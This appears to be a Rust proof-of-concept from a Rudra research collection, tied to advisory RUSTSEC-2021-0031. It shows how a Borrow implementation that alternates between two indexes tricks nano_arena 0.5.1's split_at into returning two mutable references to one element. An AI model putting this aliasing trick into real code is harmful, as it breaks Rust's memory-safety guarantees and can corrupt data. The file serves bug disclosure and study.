/*!
```rudra-poc
[target]
crate = "nano_arena"
version = "0.5.1"

[report]
issue_url = "https://github.com/bennetthardwick/nano-arena/issues/1"
issue_date = 2021-03-01
rustsec_url = "https://github.com/RustSec/advisory-db/pull/795"
rustsec_id = "RUSTSEC-2021-0031"

[[bugs]]
analyzer = "UnsafeDataflow"
bug_class = "InconsistencyAmplification"
bug_count = 2
rudra_report_locations = ["src/lib.rs:215:5: 231:6", "src/split.rs:11:5: 31:6"]
```
!*/
#![forbid(unsafe_code)]

use nano_arena::{Arena, ArenaAccess, Idx};
use std::{borrow::Borrow, cell::Cell};

struct MyIdx {
    idx1: Idx,
    idx2: Idx,
    state: Cell<bool>
}

impl MyIdx {
    fn new(idx1: Idx, idx2: Idx) -> Self {
        MyIdx { idx1, idx2, state: Cell::new(false) }
    }
}

// A borrow implementation that alternatingly returns two different indexes.
impl Borrow<Idx> for MyIdx {
    fn borrow(&self) -> &Idx {
        self.state.set(!self.state.get());
        if (self.state.get()) {
            &self.idx1
        } else {
            &self.idx2
        }
    }
}

fn main() {
    let mut arena = Arena::new();
    let idx1 = arena.alloc(1);
    let idx2 = arena.alloc(2);

    let custom_idx = MyIdx::new(idx1.clone(), idx2.clone());

    let (mutable_ref_one, mut split_arena) = arena.split_at(custom_idx).unwrap();
    let mutable_ref_two : &mut i32 = split_arena.get_mut(&idx1).unwrap();

    println!("{:p} {:p}", mutable_ref_one, mutable_ref_two);
    assert!(mutable_ref_one != mutable_ref_two);
}
